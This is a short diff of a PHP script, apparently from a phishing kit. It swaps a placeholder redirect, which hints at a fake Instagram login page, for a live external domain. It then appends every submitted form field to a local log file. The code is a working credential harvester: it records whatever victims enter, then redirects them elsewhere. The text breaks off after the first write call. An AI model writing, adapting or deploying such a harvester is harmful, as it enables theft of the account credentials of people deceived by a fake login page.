@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://yourwebsiteaddresthatyouuploadedthephp/insta.php');
+header ('Location: https://mabrakacomed.epizy.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
